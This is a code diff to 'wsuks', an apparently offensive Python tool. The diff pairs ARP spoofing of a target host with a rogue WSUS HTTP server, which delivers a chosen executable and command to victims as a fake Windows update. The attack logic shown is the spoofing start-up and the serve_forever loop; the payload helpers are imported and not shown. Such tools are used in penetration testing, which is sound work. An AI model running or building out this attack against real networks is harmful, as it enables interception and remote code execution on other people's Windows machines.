@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+from http.server import HTTPServer
 import logging
 import os
-import time
-from scapy.all import get_if_addr, conf, sniff
+from scapy.all import get_if_addr, sniff
 from wsuks.helpers.arpspoofer import ArpSpoofer
 from wsuks.helpers.logger import initLogger
 from wsuks.helpers.argparser import initParser, printBanner
@@ -15,7 +15,7 @@ from wsuks.helpers.wsusserver import WSUSUpdateHandler
 class Wsuks:
     def __init__(self, args):
         self.logger = logging.getLogger()
-        self.hostIp = get_if_addr(conf.iface)
+        self.hostIp = get_if_addr(args.interface)
 
         # Set args
         self.targetIp = args.targetIp  # Never None (required)
@@ -43,28 +43,41 @@ class Wsuks:
         # Start Arp Spoofing
         arpspoofer = ArpSpoofer()
         arpspoofer.start(self.targetIp, "192.168.0.1")
-        
-        # Restlicher Code
-        #sniff(filter="tcp and port 8530", prn=self.handlePacket, store=0)
+
+        # Prepare WSUS Update Handler
+        # sniff(filter="tcp and port 8530", prn=self.handlePacket, store=0)
         update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f'{self.hostIp}:{self.wsusPort}', self.logger)
-        update_handler.set_filedigest()
         update_handler.set_resources_xml(self.command)
+
+        self.logger.debug(update_handler)
+
+        # Prepare WSUS HTTP Server
+        http_server = HTTPServer((self.hostIp, self.wsusPort), update_handler)
         try:
-            time.sleep(10000)
+            self.logger.info(f"Starting WSUS Server on {self.hostIp}:{self.wsusPort}...")
+            http_server.serve_forever()
         except KeyboardInterrupt:
             print("")
+            self.logger.info("Stopping WSUS Server...")
+        finally:
             arpspoofer.stop()
 
     def handlePacket(self, packet):
         packet.show()
 
+
 def main():
     # Setup
     printBanner()
     args = initParser()
+
     initLogger(debug=args.debug)
-    logger = logging.getLogger()
+    logger = logging.getLogger('wsuks')
     logger.debug(args)
+    
+    # Prevent scapy from logging to console
+    scapyLogger = logging.getLogger('scapy')
+    scapyLogger.handlers.clear()
 
     wsuks = Wsuks(args)
     wsuks.run()
